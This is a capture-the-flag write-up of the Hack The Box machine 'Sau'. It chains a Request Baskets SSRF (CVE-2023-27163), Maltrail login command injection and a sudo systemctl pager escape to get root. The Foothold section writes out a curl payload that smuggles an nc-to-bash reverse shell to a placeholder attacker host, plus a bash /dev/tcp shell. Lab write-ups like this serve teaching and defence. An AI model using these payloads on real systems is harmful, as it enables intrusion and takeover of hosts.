# Sau

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.11.224 |
| **Status** | Retired |

## Overview
Sau is an Easy Linux machine featuring a `Request Baskets` instance reachable on a non-standard port. Request Baskets is vulnerable to Server-Side Request Forgery (**CVE-2023-27163**), which is used to pivot to an internal-only `Maltrail` service. Maltrail is, in turn, vulnerable to unauthenticated OS command injection, giving a shell as `puma`. A `sudo` misconfiguration around `systemctl status` is then abused to obtain a root shell.

## Reconnaissance
Nmap showed SSH, a filtered port 80, and an unusual open port 55555:

```
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown   (redirects to /web; "Request Baskets")
```

## Enumeration
Port 55555 hosted `Request Baskets`, a service that lets users create named "baskets" that act as HTTP request collectors/proxies. This version (≤ 1.2.1) is vulnerable to CVE-2023-27163: baskets can be configured with a `forward_url` and `proxy_response: true`, letting an attacker use the server itself to make arbitrary HTTP requests to internal-only resources (SSRF). Probing internal ports through this SSRF located an internal web service, `Maltrail`, running on `127.0.0.1:8338`, which is not directly reachable from outside the box.

## Foothold
`CVE-2023-27163.sh` (public PoC by entr0pie, kept in `files/`) automates creating a malicious proxy basket:

```bash
bash CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:8338/login
```

With the basket's `proxy_response` enabled, requests to the basket URL are transparently forwarded to (and responses returned from) the internal Maltrail login page, confirming SSRF access to Maltrail. Maltrail's `login` endpoint passes the `username` parameter unsanitized into a shell command, allowing OS command injection. A base64-encoded Python reverse-shell payload was smuggled through this injection point (see `maltrail.py`, kept in `files/`):

```bash
curl -X POST --data 'username=;`nc <attacker_ip> 4445 | /bin/bash | nc <attacker_ip> 4445`' \
     http://10.10.11.224:55555/<basket_path>
```

This yielded a reverse shell as the `puma` user, later upgraded to a full TTY via `bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1`.

## Privilege Escalation
`sudo -l` as `puma` showed permission to run `/usr/bin/systemctl status trail.service` without a password. Since `systemctl status` pipes its output through a pager (`less`) by default, invoking it via `sudo` and then executing a shell from within the pager (`!sh`) spawned a root shell:

```
sudo /usr/bin/systemctl status trail.service
!sh
```

## Lessons Learned
- SSRF vulnerabilities in "proxy"-style utilities (Request Baskets) can be used to reach internal-only services that are otherwise unreachable from outside a segmented network.
- Unauthenticated command injection in security/monitoring tools (Maltrail) is especially dangerous since such tools are often deployed with elevated trust.
- Allowing `sudo` on commands that can invoke an interactive pager (`less`, `more`, `systemctl status`, etc.) is a classic and easily overlooked privilege-escalation vector (GTFOBins-style shell escape).

## Tools & References
- `CVE-2023-27163.sh`, `maltrail.py` (kept under `files/`)
- **CVE-2023-27163**: Request Baskets SSRF: [github.com/entr0pie/CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163)
- Maltrail unauthenticated RCE (login command injection)
- Omitted from repository for hygiene:
  - `exploitation/CVE-2023-27163-POC/.git/`: a full clone of the upstream PoC repository; only the standalone `CVE-2023-27163.sh` script (already vendored separately) was kept. See the upstream GitHub link above for the original project.
